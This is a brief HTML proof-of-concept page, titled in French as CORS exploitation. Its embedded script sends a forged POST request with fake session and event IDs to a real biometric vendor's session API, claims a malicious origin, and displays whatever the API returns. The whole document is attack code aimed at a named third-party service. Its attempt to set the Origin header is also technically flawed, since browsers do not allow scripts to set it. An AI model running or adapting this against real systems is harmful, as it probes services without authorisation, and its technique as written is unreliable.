<html>
<body>
    <h1>Exploitation de CORS</h1>
    <script>
        // Fonction pour envoyer une requête POST à l'API
        fetch("https://api.facetec.com/api/v1.1/session", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Origin": "https://malicious.example.com"
            },
            body: JSON.stringify({
                "rt": "v2",
                "e": "initZAPITiming",
                "eventID": "malicious-test-id",
                "perLoadID": "malicious-load-id",
                "perFaceTecSessionID": "uninitialized",
                "eventDate": 1734683196947,
                "timestamp": 1734683197,
                "data": {"timeMS": 10000}
            })
        })
        .then(response => response.text())
        .then(data => {
            console.log("Réponse de l'API :", data);
            alert("Réponse de l'API : " + data);
        })
        .catch(err => {
            console.error("Erreur :", err);
            alert("Erreur : " + err);
        });
    </script>
</body>
</html>
